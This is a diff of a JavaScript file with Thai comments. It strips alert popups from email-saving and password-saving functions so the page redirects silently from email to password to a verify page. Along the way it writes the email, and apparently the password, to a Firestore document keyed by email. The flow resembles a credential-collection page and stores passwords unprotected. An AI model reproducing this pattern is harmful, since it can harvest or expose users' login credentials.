@@ -25,23 +25,20 @@ function saveEmail() {
     console.log("📩 อีเมลที่กรอก:", email);
 
     if (!email) {
-        alert("กรุณากรอกอีเมล!");
-        return;
+        return; // ❌ ไม่แจ้งเตือน แค่ไม่ให้ทำงานต่อ
     }
 
     db.collection("users").doc(email).set({
         email: email,
-        timestamp: firebase.firestore.FieldValue.serverTimestamp()  // ✅ ใช้ `firebase.firestore.FieldValue`
+        timestamp: firebase.firestore.FieldValue.serverTimestamp()
     }, { merge: true })
     .then(() => {
         console.log("✅ อีเมลถูกบันทึกลง Firebase:", email);
         localStorage.setItem("userEmail", email);
-        alert("อีเมลถูกบันทึกแล้ว!");
-        window.location.href = "password.html";
+        window.location.href = "password.html"; // 🔄 เปลี่ยนหน้าโดยไม่มี `alert`
     })
     .catch(error => {
         console.error("❌ เกิดข้อผิดพลาด:", error);
-        alert("เกิดข้อผิดพลาดในการบันทึก!");
     });
 }
 
@@ -53,14 +50,12 @@ function savePassword() {
     console.log("🔑 บันทึกรหัสผ่านสำหรับ:", email);
 
     if (!email) {
-        alert("ไม่พบอีเมล กรุณาเข้าสู่ระบบใหม่!");
-        window.location.href = "index.html";
+        window.location.href = "index.html"; // 🔄 เปลี่ยนหน้าโดยไม่มี `alert`
         return;
     }
 
     if (!password) {
-        alert("กรุณากรอกรหัสผ่าน!");
-        return;
+        return; // ❌ ไม่แจ้งเตือน แค่ไม่ให้ทำงานต่อ
     }
 
     db.collection("users").doc(email).update({
@@ -68,11 +63,9 @@ function savePassword() {
     })
     .then(() => {
         console.log("✅ รหัสผ่านถูกบันทึกใน Firebase!");
-        alert("รหัสผ่านถูกบันทึกแล้ว!");
-        window.location.href = "verify.html"; // ไปที่หน้าตรวจสอบ
+        window.location.href = "verify.html"; // 🔄 เปลี่ยนหน้าโดยไม่มี `alert`
     })
     .catch(error => {
         console.error("❌ เกิดข้อผิดพลาด:", error);
-        alert("เกิดข้อผิดพลาดในการบันทึก!");
     });
 }
